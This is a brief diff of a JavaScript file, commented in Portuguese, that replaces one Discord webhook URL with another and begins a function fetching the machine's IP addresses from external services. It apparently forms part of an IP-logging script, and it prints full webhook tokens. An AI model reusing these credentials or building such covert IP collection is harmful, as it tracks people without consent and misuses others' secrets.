@@ -1,6 +1,6 @@
 (async () => {
   // URL do seu webhook do Discord
-  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1378793512241205341/-GcMAFCBiMzLAwXVgX6lYJTbGZ7OBvsGx5XAEuIZnKPJrrtzWS1qp8KNmFuAr6xzoiTD';
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1379247096724590592/IBfSPlauP3B3HGCff6gBOqEahGmVqTDAJ1kxOmPnvS3VwIa0ZcC7DlrOptjjxQKgs-L9';
 
   // Função para pegar IPs (IPv4 e IPv6) via API externa (ipify e ip6ify)
   async function getIPs() {
